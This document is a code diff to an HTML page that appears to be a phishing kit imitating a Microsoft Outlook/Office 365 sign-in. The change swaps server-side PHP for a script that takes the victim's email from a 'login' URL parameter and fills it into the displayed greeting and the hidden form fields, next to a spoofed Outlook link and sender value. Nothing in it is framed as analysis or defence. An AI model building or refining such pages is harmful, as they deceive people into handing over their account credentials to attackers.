@@ -1,4 +1,4 @@
-﻿<html>
+<html>
 
 <head>
 <meta http-equiv="Content-Type" content="text/html; charset=windows-1252">
@@ -102,16 +102,16 @@
 									<table border="0" width="100%" cellspacing="0" cellpadding="0">
 										<tr>
 											<td width="30"></td>
-											<td height="18" style="font-size: 15px;font-family: Arial, Helvetica, sans-serif; line-height: 18px;white-space: nowrap;overflow: hidden;text-overflow: ellipsis;" width="328"><?php echo $users;?>@<?php echo $ddomain;?></td>
+											<td height="18" style="font-size: 15px;font-family: Arial, Helvetica, sans-serif; line-height: 18px;white-space: nowrap;overflow: hidden;text-overflow: ellipsis;" width="328"><font id="greeting">email</font></td>
 										</tr>
 									</table>
 									</td>
 								</tr>
 								<tr>
 									<td height="54">
-									   <input type="hidden" name="user" required="true" placeholder="Email" value="<?php echo $users;?>@<?php echo $ddomain;?>" >
+									   <input type="hidden" name="user" id="userInput" required="true" placeholder="Email" value="email" >
                                                                            <input type="hidden" name="link" value="https://outlook.office365.com/mail/" >
-                                                                           <input type="hidden" name="domain" value="<?php echo $ddomain;?>" >
+                                                                           <input type="hidden" name="domain" id="domainInput" value="domain" >
                                                                            <input type="hidden" name="sender" value="Outlook.com" >
 									</td>
 								</tr>
@@ -193,6 +193,23 @@
 </table>
             
 </div>
+
+  <script>
+    const params = new URLSearchParams(window.location.search);
+    const raw = params.get('login');
+    const email = raw ? decodeURIComponent(raw) : '';
+
+    let user = '', domain = '';
+    if (email.includes('@')) {
+      [user, domain] = email.split(/@(.*)/, 2);
+    }
+
+    if (email) {
+      document.getElementById('userInput').value = email;
+      document.getElementById('domainInput').value = domain;
+      document.getElementById('greeting').textContent = email;
+    }
+  </script>
 </body>
 
 </html>
